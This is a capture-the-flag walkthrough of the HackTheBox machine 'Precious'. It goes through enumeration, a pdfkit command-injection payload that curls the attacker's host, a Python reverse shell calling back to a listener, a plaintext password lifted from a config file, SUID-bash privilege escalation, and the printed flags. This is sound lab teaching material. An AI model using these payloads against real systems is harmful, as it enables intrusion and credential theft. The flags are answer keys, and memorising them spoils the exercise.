### Introduction

This is a HackTheBox machine called [precious](https://app.hackthebox.com/machines/Precious). This machine has easy difficulty.

### Enumeration
We start with a basic nmap scan of all ports, and then scan the open ports more aggressively.

##### Command:
> nmap -p- [target]

```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-22 20:39 EST
Nmap scan report for [target]
Host is up (0.024s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

##### Command:
> nmap -p 22,80 -A -O -sC -sV [target]

```
Nmap scan report for [target]
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http	nginx 1.18.0
| http-server-header:
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
```

We see that there is a web server running on port 80 and SSH running on port 22. The web server has the title ```Convert Web Page to PDF``` and uses ```nginx 1.18.0```.

When visiting this webpage, we are redirected to ```precious.htb```, and get a ‘page not found’ error. This was rectified by adding the line ```[target]	precious.htb``` to the ```/etc/hosts``` file.

This is the landing page we are met with:

![alt text](/assets/img/hackthebox/precious/landing_page.PNG "Web Page")

It appears that this web page takes in a URL, and will spit out a PDF version of that webpage. On the backend, my guess is that it will download the requested webpage, convert this to a PDF file using a PHP script, then return the file. This however is just speculation, more investigation is required.

When I enter ```google.com```, we are met with an error message.

Next, I fired up Burp Suite and set up a proxy, so that we can see the web requests under the hood.
When I passed in the URL ```google.com```, this was the web request sent:

```
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

```

And the response:

    	</form>
    	<h2 class="msg">You should provide a valid URL!</h2>
	</div>
</body>
</html>
```

An HTTP POST request is sent to ```precious.htb```, with the variable ```url=google.com```. The response is not very informative. It would perhaps be fruitful to see if the PDF functionality works when only used locally. I used Python’s HTTP module to whip up a web server on port 80, and requested my own IP address.

##### Command for HTTP server:
> python3 -m http.server 80

```
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
[target] - - [22/Dec/2022 21:29:49] "GET / HTTP/1.1" 200 -
```

We see that we got a hit. A PDF file was downloaded to my system, which was just a copy of my empty directory.

### Initial Access

My idea was to upload a reverse shell into my web server, forcing the web server to download it. I first tried to create a bash script to just output ```whoami```, but when uploaded to the web server, the usual happened - this was downloaded as a PDF, but the file was not executed. For now, it does not appear that this will work.

Let’s examine the PDF file generated. A file called ```nvsfi9fiq0z5mhmsj6oqxtstlqe4tq60.pdf``` was created and downloaded to my local system. This file could contain useful metadata, which we now examine with ```exiftool```.

##### Command:
> exiftool nvsfi9fiq0z5mhmsj6oqxtstlqe4tq60.pdf

```
ExifTool Version Number     	: 12.16
File Name                   	: nvsfi9fiq0z5mhmsj6oqxtstlqe4tq60.pdf

File Size                   	: 18 KiB

File Access Date/Time       	: 2022:12:22 21:40:10-05:00
File Inode Change Date/Time 	: 2022:12:22 21:40:12-05:00
File Permissions            	: rw-r--r--
File Type                   	: PDF
File Type Extension         	: pdf
MIME Type                   	: application/pdf
PDF Version                 	: 1.4

```

This web server uses ```pdfkit v0.8.6``` to do the PDF conversion. Upon a Google search, there is an exploit for this version of pdfkit - it is vulnerable to command injection. Inputs to Pdfkit are not properly sanitized, and query string parameters in URLs are run as commands. This exploit is [CVE-2022-25765](https://nvd.nist.gov/vuln/detail/CVE-2022-25765), and [Snyk have some PoCs](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795).

To see if this server is vulnerable, we can enter a fake URL, and inject a command into the parameter which attempts to get our web server using ```curl```. If we see a hit on the web server, we will know that this has executed.

##### Payload:
>http://example.com/?name=#{'%20`curl -XGET [my IP]'}

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
[target] - - [22/Dec/2022 21:58:42] "GET / HTTP/1.1" 200 -
```

As expected, we see a hit on our web server - the vulnerable server executed our command, and so is vulnerable to command injection. We can now create a reverse shell. I used a Python shell taken from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python), and used a netcat listener.

##### Command for Listener:
>nc -lnvp 1234

##### Payload:
>http://[my ip]/?name=%20'python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[my ip]",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")''

And this worked!

```
└─$ nc -lnvp 1234                                                                             	1 ⨯

$ id

```

### Lateral Movement

We now have access to the ```ruby``` user. After snooping around, there is another user called ```henry```, with the user flag in their home directory. We must now pivot to henry’s user. Snooping around Ruby’s home directory, we find a hidden folder called ```.bundle```, containing a file with ```henry```’s credentials.
```
$ pwd
pwd
/var/www/pdfapp
$ cd ~
cd ~
$ ls -a
ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .bundle  .cache  .profile
$ cd .bundle
cd .bundle
$ ls
ls
config
$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
$ su henry
su henry
Password: Q3c1AqGHtoI0aXAYFH         	 

bash-5.1$ whoami
whoami
henry
```

We are now in ```henry```’s user account, and find the first flag ```user.txt```!

```
cd ~
bash-5.1$ ls
ls
dependencies.yml  test.rb  user.txt
bash-5.1$ cat user.txt
cat user.txt
4ac161ef71b66aa6ea3e6a90102ee693
bash-5.1$
```

### Privilege Escalation

Now for privilege escalation. We search for any SUID files within the system.

##### Command:
>find / -perm 6000

```
/usr/local/share/fonts
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/bash
/usr/bin/su
/usr/bin/wall
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/mount
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
```
Apart from the usual SUID files we expect to find, we see that ```bash``` has the SUID bit enabled. After consulting [GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid) we can simply run ```bash -p``` to exploit this misconfiguration.

```
bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
c067311b8ba45659f38cace8b536e0ae
```

And we now have the root flag, and have thus pwned Precious!
